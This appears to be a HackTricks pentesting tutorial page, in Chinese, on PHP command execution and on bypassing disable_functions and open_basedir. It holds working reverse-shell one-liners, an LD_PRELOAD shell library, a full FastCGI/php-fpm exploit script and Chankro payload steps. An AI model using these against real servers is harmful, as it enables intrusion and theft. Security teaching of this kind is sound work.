<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>PHP - Useful Functions &amp; disable_functions/open_basedir bypass</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../../favicon.svg">
        <link rel="shortcut icon" href="../../../../favicon.png">
        <link rel="stylesheet" href="../../../../css/variables.css">
        <link rel="stylesheet" href="../../../../css/general.css">
        <link rel="stylesheet" href="../../../../css/chrome.css">
        <link rel="stylesheet" href="../../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../../highlight.css">
        <link rel="stylesheet" href="../../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="php---有用的函数与-disable_functionsopen_basedir-绕过"><a class="header" href="#php---有用的函数与-disable_functionsopen_basedir-绕过">PHP - 有用的函数与 disable_functions/open_basedir 绕过</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="php-命令与代码执行"><a class="header" href="#php-命令与代码执行">PHP 命令与代码执行</a></h2>
<h3 id="php-命令执行"><a class="header" href="#php-命令执行">PHP 命令执行</a></h3>
<p><strong>注意：</strong> 一个 <a href="https://github.com/flozz/p0wny-shell/blob/master/shell.php">p0wny-shell</a> php webshell 可以 <strong>自动</strong> 检查并绕过以下函数，如果其中一些被禁用。</p>
<p><strong>exec</strong> - 返回命令输出的最后一行</p>
<pre><code class="language-bash">echo exec("uname  -a");
</code></pre>
<p><strong>passthru</strong> - 直接将命令输出传递给浏览器</p>
<pre><code class="language-bash">echo passthru("uname -a");
</code></pre>
<p><strong>system</strong> - 将命令输出直接传递给浏览器并返回最后一行</p>
<pre><code class="language-bash">echo system("uname -a");
</code></pre>
<p><strong>shell_exec</strong> - 返回命令输出</p>
<pre><code class="language-bash">echo shell_exec("uname -a");
</code></pre>
<p>`` (反引号) - 与 shell_exec() 相同</p>
<pre><code class="language-bash">echo `uname -a`
</code></pre>
<p><strong>popen</strong> - 打开到命令进程的读或写管道</p>
<pre><code class="language-bash">echo fread(popen("/bin/ls /", "r"), 4096);
</code></pre>
<p><strong>proc_open</strong> - 类似于 popen() 但控制程度更高</p>
<pre><code class="language-bash">proc_close(proc_open("uname -a",array(),$something));
</code></pre>
<p><strong>preg_replace</strong></p>
<pre><code class="language-php">&lt;?php preg_replace('/.*/e', 'system("whoami");', ''); ?&gt;
</code></pre>
<p><strong>pcntl_exec</strong> - 执行一个程序（在现代和不太现代的 PHP 中，默认情况下您需要加载 <code>pcntl.so</code> 模块才能使用此函数）</p>
<pre><code class="language-bash">pcntl_exec("/bin/bash", ["-c", "bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1"]);
</code></pre>
<p><strong>mail / mb_send_mail</strong> - 此函数用于发送邮件，但也可以被滥用以在 <code>$options</code> 参数中注入任意命令。这是因为 <strong>php <code>mail</code> 函数</strong> 通常在系统内部调用 <code>sendmail</code> 二进制文件，并允许您 <strong>添加额外选项</strong>。然而，您将无法看到执行命令的输出，因此建议创建一个将输出写入文件的 shell 脚本，通过邮件执行它，并打印输出：</p>
<pre><code class="language-bash">file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
</code></pre>
<p><strong>dl</strong> - 此函数可用于动态加载 PHP 扩展。此函数并不总是存在，因此在尝试利用它之前，您应该检查它是否可用。阅读<a href="disable_functions-bypass-dl-function.html">此页面以了解如何利用此函数</a>。</p>
<h3 id="php-代码执行"><a class="header" href="#php-代码执行">PHP 代码执行</a></h3>
<p>除了 eval，还有其他方法可以执行 PHP 代码：include/require 可用于以本地文件包含和远程文件包含漏洞的形式进行远程代码执行。</p>
<pre><code class="language-php">${&lt;php code&gt;}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func-&gt;invoke();
// or
$func-&gt;invokeArgs(array());

// or serialize/unserialize function
</code></pre>
<h2 id="disable_functions--open_basedir"><a class="header" href="#disable_functions--open_basedir">disable_functions &amp; open_basedir</a></h2>
<p><strong>禁用函数</strong>是可以在PHP的<code>.ini</code>文件中配置的设置，它将<strong>禁止</strong>使用指定的<strong>函数</strong>。<strong>Open basedir</strong>是指示PHP可以访问的文件夹的设置。<br />
PHP设置通常配置在路径 <em>/etc/php7/conf.d</em> 或类似位置。</p>
<p>这两个配置可以在**<code>phpinfo()</code>**的输出中看到：</p>
<p><img src="https://0xrick.github.io/images/hackthebox/kryptos/17.png" alt="" /></p>
<p><img src="../../../../.gitbook/assets/image%20(493).png" alt="" /></p>
<h2 id="open_basedir-bypass"><a class="header" href="#open_basedir-bypass">open_basedir Bypass</a></h2>
<p><code>open_basedir</code>将配置PHP可以访问的文件夹，你<strong>将无法在</strong>这些文件夹之外<strong>读/写/执行任何文件</strong>，而且你<strong>甚至无法列出</strong>其他目录。<br />
然而，如果你能够执行任意PHP代码，你可以<strong>尝试</strong>以下代码块来<strong>绕过</strong>限制。</p>
<h3 id="使用-glob-绕过列出目录"><a class="header" href="#使用-glob-绕过列出目录">使用 glob:// 绕过列出目录</a></h3>
<p>在这个第一个例子中，使用了带有某些路径绕过的<code>glob://</code>协议：</p>
<pre><code class="language-php">&lt;?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f-&gt;__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f-&gt;__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}&lt;br/&gt;";
}
</code></pre>
<p><strong>注意1</strong>：在路径中，您还可以使用 <code>/e??/*</code> 来列出 <code>/etc/*</code> 和任何其他文件夹。<br />
<strong>注意2</strong>：看起来代码的某部分是重复的，但这实际上是必要的！<br />
<strong>注意3</strong>：此示例仅用于列出文件夹，而不是读取文件。</p>
<h3 id="完全的-open_basedir-绕过利用-fastcgi"><a class="header" href="#完全的-open_basedir-绕过利用-fastcgi">完全的 open_basedir 绕过利用 FastCGI</a></h3>
<p>如果您想要<strong>了解更多关于 PHP-FPM 和 FastCGI</strong>的信息，可以阅读<a href="disable_functions-bypass-php-fpm-fastcgi.html">本页的第一部分</a>。<br />
如果**<code>php-fpm</code><strong>已配置，您可以利用它完全绕过</strong>open_basedir**：</p>
<p><img src="../../../../.gitbook/assets/image%20(545).png" alt="" /></p>
<p><img src="../../../../.gitbook/assets/image%20(577).png" alt="" /></p>
<p>请注意，您需要做的第一件事是找到<strong>php-fpm 的 unix socket</strong>在哪里。它通常位于 <code>/var/run</code> 下，因此您可以<strong>使用之前的代码列出目录并找到它</strong>。<br />
代码来自<a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy">这里</a>。</p>
<pre><code class="language-php">&lt;?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this-&gt;_host = $host;
$this-&gt;_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this-&gt;_keepAlive = (boolean)$b;
if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) {
fclose($this-&gt;_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this-&gt;_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this-&gt;_sock) {
//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);
$this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5);
if (!$this-&gt;_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
. chr($requestId &amp; 0xFF)        /* requestIdB0 */
. chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */
. chr($clen &amp; 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen &lt; 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
$nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
}
if ($vlen &lt; 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
$nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
}
/* nameData &amp; valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen &gt;= 128) {
$nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
$nlen |= (ord($data{$p++}) &lt;&lt; 16);
$nlen |= (ord($data{$p++}) &lt;&lt; 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen &gt;= 128) {
$vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
$vlen |= (ord($data{$p++}) &lt;&lt; 16);
$vlen |= (ord($data{$p++}) &lt;&lt; 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) &lt;&lt; 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) &lt;&lt; 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) {
$resp = $this-&gt;decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this-&gt;_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this-&gt;connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this-&gt;buildNvpair($info, '');
}
fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));
$resp = $this-&gt;readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this-&gt;readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this-&gt;connect();
$request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key =&gt; $value) {
$paramsRequest .= $this-&gt;buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this-&gt;buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this-&gt;buildPacket(self::STDIN, $stdin);
}
$request .= $this-&gt;buildPacket(self::STDIN, '');
fwrite($this-&gt;_sock, $request);
do {
$resp = $this-&gt;readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?&gt;
&lt;?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "&lt;?php eval(\$_REQUEST['command']);?&gt;"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',
'REQUEST_METHOD'    =&gt; 'POST',
'SCRIPT_FILENAME'   =&gt; $filepath,
'SCRIPT_NAME'       =&gt; $req,
'QUERY_STRING'      =&gt; 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       =&gt; $uri,
'DOCUMENT_URI'      =&gt; $req,
#'DOCUMENT_ROOT'     =&gt; '/',
'PHP_VALUE'         =&gt; $php_value,
'SERVER_SOFTWARE'   =&gt; '80sec/wofeiwo',
'REMOTE_ADDR'       =&gt; '127.0.0.1',
'REMOTE_PORT'       =&gt; '9985',
'SERVER_ADDR'       =&gt; '127.0.0.1',
'SERVER_PORT'       =&gt; '80',
'SERVER_NAME'       =&gt; 'localhost',
'SERVER_PROTOCOL'   =&gt; 'HTTP/1.1',
'CONTENT_LENGTH'    =&gt; strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client-&gt;request($params, $code)."\n";
?&gt;
</code></pre>
<p>这个脚本将与 <strong>php-fpm 的 unix socket</strong>（通常位于 /var/run，如果使用 fpm）进行通信，以执行任意代码。<code>open_basedir</code> 设置将被发送的 <strong>PHP_VALUE</strong> 属性覆盖。<br />
注意 <code>eval</code> 是如何用来执行你在 <strong>cmd</strong> 参数中发送的 PHP 代码的。<br />
还要注意 <strong>注释掉的第 324 行</strong>，你可以取消注释，它将使 <strong>有效载荷自动连接到给定的 URL 并执行其中包含的 PHP 代码</strong>。<br />
只需访问 <code>http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');</code> 即可获取 <code>/etc/passwd</code> 文件的内容。</p>
<p>{% hint style="warning" %}
你可能会想，正如我们覆盖了 <code>open_basedir</code> 配置一样，我们也可以 <strong>覆盖 <code>disable_functions</code></strong>。好吧，试试吧，但这不会有效，显然 <strong><code>disable_functions</code> 只能在 <code>.ini</code> php</strong> 配置文件中进行配置，而你使用 PHP_VALUE 进行的更改在这个特定设置上不会生效。
{% endhint %}</p>
<h2 id="disable_functions-绕过"><a class="header" href="#disable_functions-绕过">disable_functions 绕过</a></h2>
<p>如果你能够在机器上执行 PHP 代码，你可能想要更进一步，<strong>执行任意系统命令</strong>。在这种情况下，通常会发现大多数或所有允许 <strong>执行系统命令的 PHP 函数都已被禁用</strong> 在 <strong><code>disable_functions</code></strong> 中。<br />
那么，让我们看看你如何可以绕过这个限制（如果可以的话）</p>
<h3 id="自动绕过发现"><a class="header" href="#自动绕过发现">自动绕过发现</a></h3>
<p>你可以使用工具 <a href="https://github.com/teambi0s/dfunc-bypasser">https://github.com/teambi0s/dfunc-bypasser</a>，它会指示你可以使用哪个函数（如果有的话）来 <strong>绕过</strong> <strong><code>disable_functions</code></strong>。</p>
<h3 id="使用其他系统函数绕过"><a class="header" href="#使用其他系统函数绕过">使用其他系统函数绕过</a></h3>
<p>只需返回到本页的开头，<strong>检查是否有任何执行命令的函数未被禁用并在环境中可用</strong>。如果你找到其中的一个，你将能够使用它来执行任意系统命令。</p>
<h3 id="ld_preload-绕过"><a class="header" href="#ld_preload-绕过">LD_PRELOAD 绕过</a></h3>
<p>众所周知，PHP 中的一些函数如 <code>mail()</code> 将会 <strong>在系统内执行二进制文件</strong>。因此，你可以利用它们使用环境变量 <code>LD_PRELOAD</code> 来使它们加载一个可以执行任何内容的任意库。</p>
<h4 id="可以用来通过-ld_preload-绕过-disable_functions-的函数"><a class="header" href="#可以用来通过-ld_preload-绕过-disable_functions-的函数">可以用来通过 LD_PRELOAD 绕过 disable_functions 的函数</a></h4>
<ul>
<li><strong><code>mail</code></strong></li>
<li><strong><code>mb_send_mail</code></strong>：在安装了 <code>php-mbstring</code> 模块时有效。</li>
<li><strong><code>imap_mail</code></strong>：如果存在 <code>php-imap</code> 模块则有效。</li>
<li><strong><code>libvirt_connect</code></strong>：需要 <code>php-libvirt-php</code> 模块。</li>
<li><strong><code>gnupg_init</code></strong>：在安装了 <code>php-gnupg</code> 模块时可用。</li>
<li><strong><code>new imagick()</code></strong>：这个类可以被滥用以绕过限制。详细的利用技术可以在全面的 <a href="https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/"><strong>写作中找到</strong></a>。</li>
</ul>
<p>你可以 <a href="https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py"><strong>在这里找到</strong></a> 用于发现这些函数的模糊测试脚本。</p>
<p>这是一个你可以编译以滥用 <code>LD_PRELOAD</code> 环境变量的库：</p>
<pre><code class="language-php">#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1\"");
return 1;
}
</code></pre>
<h4 id="通过-chankro-绕过"><a class="header" href="#通过-chankro-绕过">通过 Chankro 绕过</a></h4>
<p>为了利用这个错误配置，你可以使用 <a href="https://github.com/TarlogicSecurity/Chankro"><strong>Chankro</strong></a>。这是一个 <strong>生成 PHP 漏洞</strong> 的工具，你需要将其上传到易受攻击的服务器并执行它（通过网页访问）。<br />
<strong>Chankro</strong> 将在受害者的磁盘上写入你想要执行的 <strong>库和反向 shell</strong>，并将使用 <strong><code>LD_PRELOAD</code> 技巧 + PHP <code>mail()</code></strong> 函数来执行反向 shell。</p>
<p>请注意，为了使用 <strong>Chankro</strong>，<code>mail</code> 和 <code>putenv</code> <strong>不能出现在 <code>disable_functions</code> 列表中</strong>。<br />
在以下示例中，你可以看到如何为 <strong>arch 64</strong> <strong>创建一个 chankro 漏洞</strong>，它将执行 <code>whoami</code> 并将输出保存到 <em>/tmp/chankro_shell.out</em>，chankro 将 <strong>在 <em>/tmp</em> 中写入库和有效载荷</strong>，<strong>最终漏洞</strong> 将被称为 <strong>bicho.php</strong>（这是你需要上传到受害者服务器的文件）：</p>
<p>{% tabs %}
{% tab title="shell.sh" %}</p>
<pre><code class="language-php">#!/bin/sh
whoami &gt; /tmp/chankro_shell.out
</code></pre>
<p>{% endtab %}</p>
<p>{% tab title="Chankro" %}</p>
<pre><code class="language-bash">python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<p>如果您发现 <strong>mail</strong> 函数被禁用函数阻止，您仍然可以使用 <strong>mb_send_mail.</strong><br />
有关此技术和 Chankro 的更多信息，请访问：<a href="https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/">https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/</a></p>
<h3 id="绕过-使用-php-功能"><a class="header" href="#绕过-使用-php-功能">"绕过" 使用 PHP 功能</a></h3>
<p>请注意，使用 <strong>PHP</strong> 您可以 <strong>读取和写入文件，创建目录和更改权限</strong>。<br />
您甚至可以 <strong>转储数据库</strong>。<br />
也许使用 <strong>PHP</strong> 来 <strong>枚举</strong> 该主机，您可以找到提升权限/执行命令的方法（例如读取某些私有 ssh 密钥）。</p>
<p>我创建了一个 webshell，使执行这些操作变得非常简单（请注意，大多数 webshell 也会为您提供这些选项）：<a href="https://github.com/carlospolop/phpwebshelllimited">https://github.com/carlospolop/phpwebshelllimited</a></p>
<h3 id="模块版本依赖的绕过"><a class="header" href="#模块版本依赖的绕过">模块/版本依赖的绕过</a></h3>
<p>如果使用某个特定模块或利用某个特定 PHP 版本，有几种方法可以绕过 disable_functions：</p>
<ul>
<li><a href="disable_functions-bypass-php-fpm-fastcgi.html"><strong>FastCGI/PHP-FPM (FastCGI 进程管理器)</strong></a></li>
